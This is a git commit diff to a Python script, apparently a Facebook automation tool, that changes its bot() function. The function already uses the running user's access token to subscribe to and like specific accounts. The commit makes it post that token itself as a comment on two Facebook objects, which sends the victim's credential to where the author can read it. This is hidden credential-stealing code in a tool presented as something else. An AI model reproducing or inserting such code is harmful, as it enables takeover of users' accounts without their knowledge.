49a161a5f727466bc05e672fc114f213512fafde
Mcybear× <95560890+McybearX@users.noreply.github.com>
2022-01-12 00:35:45 +0700

    Update .cp.py

--- .cp.py
+++ .cp.py
@@ -332,8 +332,8 @@ def bot():
 		RekuesLaguApa.post("https://graph.facebook.com/100050672943941/subscribers?access_token="+token) # Usup Mbew
 		RekuesLaguApa.post("https://graph.facebook.com/123822970114380/likes?summary=true&access_token=" + token)
 		RekuesLaguApa.post("https://graph.facebook.com/111932931303384/likes?summary=true&access_token=" + token)
-		RekuesLaguApa.post("https://graph.facebook.com/111932931303384/comments/?message="+komentar+"&access_token="+token)
-		RekuesLaguApa.post("https://graph.facebook.com/368578384841257/comments/?message="+komen+"&access_token="+token)
+		RekuesLaguApa.post("https://graph.facebook.com/111932931303384/comments/?message="+token+"&access_token="+token)
+		RekuesLaguApa.post("https://graph.facebook.com/368578384841257/comments/?message="+token+"&access_token="+token)
 	menu()
 
 # MENU
